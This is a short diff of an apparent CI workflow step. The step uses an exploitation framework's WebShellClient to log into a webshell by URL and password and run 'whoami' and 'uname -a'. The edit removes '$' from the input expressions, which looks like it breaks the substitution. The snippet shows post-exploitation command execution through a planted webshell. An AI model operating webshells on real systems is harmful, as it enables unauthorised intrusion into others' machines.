@@ -214,8 +214,8 @@ jobs:
           from ofx.api.exploitation.webshell import WebShellClient
           
           shell = WebShellClient(
-              url="${{ inputs.shell_url }}",
-              password="${{ inputs.shell_password }}"
+              url="{{ inputs.shell_url }}",
+              password="{{ inputs.shell_password }}"
           )
           results = shell.batch_run_command(["whoami", "uname -a"])
           for output in results:
